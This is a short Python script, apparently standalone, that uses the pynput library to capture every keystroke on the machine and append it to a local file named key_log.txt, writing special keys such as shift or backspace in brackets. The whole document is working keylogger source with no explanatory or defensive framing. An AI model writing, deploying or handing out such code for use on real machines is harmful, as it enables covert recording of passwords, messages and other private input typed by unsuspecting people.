from pynput.keyboard import Listener, Key

filename = "key_log.txt"

def on_press(key):
    f = open(filename, 'a')  

    if hasattr(key, 'char'):
        f.write(key.char)
    elif key == Key.space:
        f.write(' ')
    elif key == Key.enter:
        f.write('\n')
    elif key == Key.tab:
        f.write('\t')
    else:
        f.write('[' + key.name + ']')

    f.close()

with Listener(on_press=on_press) as listener:
    listener.join()